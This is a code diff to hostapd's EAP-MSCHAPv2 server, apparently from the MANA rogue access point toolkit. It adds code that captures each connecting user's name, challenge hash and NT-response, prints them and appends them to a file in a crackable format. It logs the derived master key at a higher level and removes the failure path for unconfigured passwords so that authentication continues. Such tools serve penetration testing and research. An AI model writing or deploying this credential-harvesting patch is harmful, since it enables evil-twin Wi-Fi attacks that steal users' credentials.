@@ -12,7 +12,7 @@
 #include "crypto/ms_funcs.h"
 #include "crypto/random.h"
 #include "eap_i.h"
-
+#include <stdlib.h>
 
 struct eap_mschapv2_hdr {
 	u8 op_code; /* MSCHAPV2_OP_* */
@@ -287,9 +287,11 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 	u8 flags;
 	size_t len, name_len, i;
 	u8 expected[24];
+  	u8 challenge_hash1[8];
 	const u8 *username, *user;
 	size_t username_len, user_len;
 	int res;
+	int x;
 	char *buf;
 
 	pos = eap_hdr_validate(EAP_VENDOR_IETF, EAP_TYPE_MSCHAPV2, respData,
@@ -373,6 +375,39 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 	}
 #endif /* CONFIG_TESTING_OPTIONS */
 
+	//MANA EAP capture
+	challenge_hash(peer_challenge, data->auth_challenge, username, username_len, challenge_hash1);
+
+	wpa_hexdump(MSG_DEBUG, "EAP-MSCHAPV2: Challenge Hash", challenge_hash1, 8);
+	wpa_printf(MSG_INFO, "MANA (EAP-FAST) : Username:%s", name);
+	wpa_printf(MSG_INFO, "MANA (EAP-FAST) : Challenge");
+	printf("MANA (EAP-FAST) : ");
+	for (x=0;x<7;x++)
+                printf("%02x:",challenge_hash1[x]);
+        printf("%02x\n",challenge_hash1[7]);
+
+        wpa_printf(MSG_INFO, "MANA (EAP-FAST) : Response");
+        printf("MANA (EAP-FAST) : ");
+        for (x=0;x<23;x++)
+                printf("%02x:",nt_response[x]);
+        printf("%02x\n",nt_response[23]);
+
+	char *ennode = getenv("MANANODE");
+	FILE *f = fopen(ennode, "a");
+	if (f != NULL) {
+		const char *hdr = "CHAP";
+		fprintf(f, "%s|%s|", hdr, name);
+		for (x = 0; x < 7; x++) {
+			fprintf(f, "%02x:", challenge_hash1[x]);
+		}
+		fprintf(f, "%02x|", challenge_hash1[7]);
+		for (x = 0; x < 23; x++) {
+			fprintf(f, "%02x:", nt_response[x]);
+		}
+		fprintf(f, "%02x\n", nt_response[23]);
+		fclose(f);
+	}
+
 	if (username_len != user_len ||
 	    os_memcmp(username, user, username_len) != 0) {
 		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Mismatch in user names");
@@ -438,7 +473,7 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 			return;
 		}
 		data->master_key_valid = 1;
-		wpa_hexdump_key(MSG_DEBUG, "EAP-MSCHAPV2: Derived Master Key",
+		wpa_hexdump_key(MSG_INFO, "EAP-MSCHAPV2: Derived Master Key",
 				data->master_key, MSCHAPV2_KEY_LEN);
 	} else {
 		wpa_hexdump(MSG_MSGDUMP, "EAP-MSCHAPV2: Expected NT-Response",
@@ -509,9 +544,6 @@ static void eap_mschapv2_process(struct eap_sm *sm, void *priv,
 	struct eap_mschapv2_data *data = priv;
 
 	if (sm->user == NULL || sm->user->password == NULL) {
-		wpa_printf(MSG_INFO, "EAP-MSCHAPV2: Password not configured");
-		data->state = FAILURE;
-		return;
 	}
 
 	switch (data->state) {
